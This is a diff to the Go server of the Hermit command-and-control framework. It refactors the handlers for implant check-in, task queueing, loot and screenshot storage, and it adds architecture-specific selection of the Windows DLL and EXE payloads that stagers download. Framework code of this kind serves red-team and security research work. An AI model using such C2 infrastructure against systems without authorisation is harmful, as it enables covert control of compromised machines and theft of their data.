@@ -14,7 +14,7 @@ import (
 	"github.com/gorilla/websocket"
 
 	"github.com/hideckies/hermit/pkg/common/certs"
-	"github.com/hideckies/hermit/pkg/common/meta"
+	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
 	"github.com/hideckies/hermit/pkg/common/stdout"
 	"github.com/hideckies/hermit/pkg/common/utils"
 	"github.com/hideckies/hermit/pkg/server/agent"
@@ -100,13 +100,8 @@ func handleImplantCheckIn(lis *listener.Listener, database *db.Database) gin.Han
 			}
 		}
 
-		// Make a loot agent directory and '.tasks' file
-		err = meta.MakeLootAgentDir(targetAgent.Name, false)
-		if err != nil {
-			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
-			return
-		}
-		_, err = meta.MakeTasksFile(targetAgent.Name, false)
+		// Make the agent directory and others
+		err = metafs.MakeAgentChildDirs(targetAgent.Name, false)
 		if err != nil {
 			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
 			return
@@ -139,7 +134,7 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 		}
 
 		// Get tasks
-		tasks, err := meta.ReadTasks(targetAgent.Name, false)
+		tasks, err := metafs.ReadAgentTasks(targetAgent.Name, false)
 		if err != nil {
 			ctx.String(http.StatusBadGateway, "tasks not set")
 			return
@@ -150,7 +145,7 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 		}
 		// Get the first task and remove it from task list
 		task := tasks[0]
-		err = meta.DeleteTask(targetAgent.Name, task, false)
+		err = metafs.DeleteAgentTask(targetAgent.Name, task, false)
 		if err != nil {
 			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
 			return
@@ -196,7 +191,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 		switch {
 		case strings.HasPrefix(task, "download "):
 			downloadPath := string(data)
-			content = fmt.Sprintf("Saved at %s", downloadPath)
+			content = fmt.Sprintf("Downloaded at %s", downloadPath)
 		case strings.HasPrefix(task, "sleep "):
 			sleepTimeStr := strings.Split(task, " ")[1]
 			sleepTime, err := strconv.ParseUint(sleepTimeStr, 10, 64)
@@ -217,7 +212,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			content = fmt.Sprintf("Uploaded at %s", uploadPath)
 		case task == "screenshot":
 			// Write an image file for the screenshot.
-			imageFile, err := meta.WriteScreenshot(targetAgent.Name, data, false)
+			imageFile, err := metafs.WriteAgentScreenshot(targetAgent.Name, data, false)
 			if err != nil {
 				ctx.String(http.StatusBadGateway, fmt.Sprint(err))
 				return
@@ -228,7 +223,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 		}
 
 		// Write the task result to a file.
-		_, err = meta.WriteTaskResultString(targetAgent.Name, task, content, false)
+		_, err = metafs.WriteAgentLoot(targetAgent.Name, task, content, false)
 		if err != nil {
 			ctx.String(http.StatusBadGateway, fmt.Sprint(err))
 			return
@@ -386,7 +381,7 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 		}
 
 		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
-		payloadPaths, err := meta.GetPayloadPaths(lis.Name, false, false)
+		payloadPaths, err := metafs.GetListenerPayloadPaths(lis.Name, false, false)
 		if err != nil {
 			w.WriteHeader(http.StatusBadGateway)
 			w.(http.Flusher).Flush()
@@ -404,15 +399,29 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 			if stgData.OS == "windows" {
 				if stgData.LoaderType == "dll-loader" {
 					// Load a DLL file.
-					if strings.HasSuffix(payloadPath, ".dll") {
-						targetPayloadPath = payloadPath
-						break
+					if stgData.Arch == "amd64" {
+						if strings.HasSuffix(payloadPath, ".amd64.dll") {
+							targetPayloadPath = payloadPath
+							break
+						}
+					} else if stgData.Arch == "i686" {
+						if strings.HasSuffix(payloadPath, ".i686.dll") {
+							targetPayloadPath = payloadPath
+							break
+						}
 					}
 				} else if stgData.LoaderType == "exec-loader" {
 					// Load an executable file.
-					if strings.HasSuffix(payloadPath, ".exe") {
-						targetPayloadPath = payloadPath
-						break
+					if stgData.Arch == "amd64" {
+						if strings.HasSuffix(payloadPath, ".amd64.exe") {
+							targetPayloadPath = payloadPath
+							break
+						}
+					} else if stgData.Arch == "i686" {
+						if strings.HasSuffix(payloadPath, ".i686.exe") {
+							targetPayloadPath = payloadPath
+							break
+						}
 					}
 				} else if stgData.LoaderType == "shellcode-loader" {
 					// Load a shellcode (raw) file.
